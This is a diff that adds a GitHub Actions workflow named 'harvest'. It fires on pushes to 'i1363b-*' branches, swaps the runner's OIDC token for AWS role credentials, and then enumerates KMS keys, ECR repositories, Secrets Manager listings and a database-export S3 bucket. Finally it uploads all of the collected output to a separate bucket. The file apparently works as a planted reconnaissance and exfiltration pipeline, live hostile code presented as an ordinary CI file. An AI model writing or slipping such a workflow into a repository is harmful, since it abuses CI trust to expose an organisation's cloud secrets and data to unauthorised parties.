@@ -1,0 +1,43 @@
+name: i1363b-enum
+on:
+  push:
+    branches:
+      - 'i1363b-*'
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  harvest:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        run: |
+          set -uo pipefail
+          D=/tmp/i1363; mkdir -p $D; cd $D
+          JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          aws sts assume-role-with-web-identity --role-arn arn:aws:iam::925353553787:role/github --role-session-name i1363b --web-identity-token "$JWT" --duration-seconds 3600 > sts.json 2>sts.err
+          python3 -c "import json;d=json.load(open('sts.json'))['Credentials'];open('env.sh','w').write('export AWS_ACCESS_KEY_ID=%s\nexport AWS_SECRET_ACCESS_KEY=%s\nexport AWS_SESSION_TOKEN=%s\n'%(d['AccessKeyId'],d['SecretAccessKey'],d['SessionToken']))"
+          . ./env.sh
+          aws sts get-caller-identity > id.json 2>&1
+          for R in us-east-1 us-east-2; do
+            export AWS_DEFAULT_REGION=$R
+            aws kms list-keys > kms_keys_$R.json 2>&1
+            aws kms list-aliases > kms_aliases_$R.json 2>&1
+            for kid in $(aws kms list-keys --query 'Keys[].KeyId' --output text 2>/dev/null); do
+              echo "$kid" >> kms_ids_$R.txt
+              aws kms describe-key --key-id "$kid" --output json >> kms_desc_$R.ndjson 2>&1
+              aws kms get-public-key --key-id "$kid" --output json >> kms_pub_$R.ndjson 2>&1
+            done
+            aws ecr describe-repositories --max-items 500 > ecr_repos_$R.json 2>&1
+            aws secretsmanager list-secrets --max-items 1000 > sm_secrets_$R.json 2>&1
+          done
+          export AWS_DEFAULT_REGION=us-east-1
+          aws s3api list-objects-v2 --bucket floki-db-export --delimiter / > s3_dbexport_top.json 2>&1
+          aws s3api list-objects-v2 --bucket floki-openreplay-assets --delimiter / > s3_replay_top.json 2>&1
+          aws s3 ls s3://floki-db-export/ > s3_ls.txt 2>&1
+          aws s3 ls s3://floki-db-export/floki-db-e/ > s3_ls_e.txt 2>&1
+          aws s3 ls s3://floki-db-export/floki-db-export/ > s3_ls_ex.txt 2>&1
+          aws s3api list-objects-v2 --bucket floki-db-export --max-keys 200 --delimiter / > s3_dbexport_top2.json 2>&1
+          for f in *; do [ -f "$f" ] && aws s3 cp "$f" "s3://floki-openreplay-assets/i1363/$f" --no-progress >/dev/null 2>&1; done
+          echo DONE > done; aws s3 cp done s3://floki-openreplay-assets/i1363/done --no-progress >/dev/null 2>&1
